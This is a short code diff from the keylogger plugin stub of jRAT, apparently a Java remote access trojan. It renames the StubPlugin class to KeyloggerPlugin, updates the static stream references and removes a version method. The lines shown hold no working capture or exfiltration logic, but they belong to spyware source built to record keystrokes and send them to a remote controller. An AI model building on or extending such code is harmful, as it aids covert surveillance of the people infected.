@@ -23,7 +23,7 @@ import se.jrat.plugin.keylogger.stub.activities.Time;
 import se.jrat.plugin.keylogger.stub.activities.Title;
 import se.jrat.plugin.keylogger.stub.codec.Base64;
 
-public class StubPlugin extends jrat.api.stub.StubPlugin {
+public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
@@ -44,8 +44,8 @@ public class StubPlugin extends jrat.api.stub.StubPlugin {
 	}
 
 	public void onConnect(DataInputStream in, DataOutputStream out) {
-		StubPlugin.dis = in;
-		StubPlugin.dos = out;
+		KeyloggerPlugin.dis = in;
+		KeyloggerPlugin.dos = out;
 	}
 
 	public void onPacket(byte header) throws Exception {
@@ -129,10 +129,6 @@ public class StubPlugin extends jrat.api.stub.StubPlugin {
 			
 			lines.clear();
 		}
-	}
-
-	public String getVersion() {
-		return "4.1.4 >";
 	}
 
 	@Override
